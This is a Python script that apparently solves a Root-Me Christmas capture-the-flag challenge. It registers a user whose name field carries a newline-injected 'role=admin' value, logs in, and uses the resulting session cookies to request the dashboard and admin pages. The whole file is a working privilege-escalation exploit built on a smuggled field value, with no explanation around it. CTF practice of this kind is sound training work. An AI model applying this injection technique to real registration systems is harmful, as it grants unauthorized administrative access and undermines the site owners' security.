import requests

email = 'tata@tata.tt'
name = 'toto\nrole=admin'
password = 'toto'

data_reg = {'email': email, 'name': name, 'password': password}

r = requests.post('https://day15.challenges.xmas.root-me.org/register', json=data_reg, verify=False)

print(r.text)

data_login = {'email': email, 'password': password}

r = requests.post('https://day15.challenges.xmas.root-me.org/login', json=data_login, verify=False)

cookies = r.cookies.get_dict()

print(r.text, cookies)

r = requests.get('https://day15.challenges.xmas.root-me.org/dashboard', cookies=cookies, verify=False)

print(r.text)

r = requests.get('https://day15.challenges.xmas.root-me.org/admin', cookies=cookies, verify=False)

print(r.text)
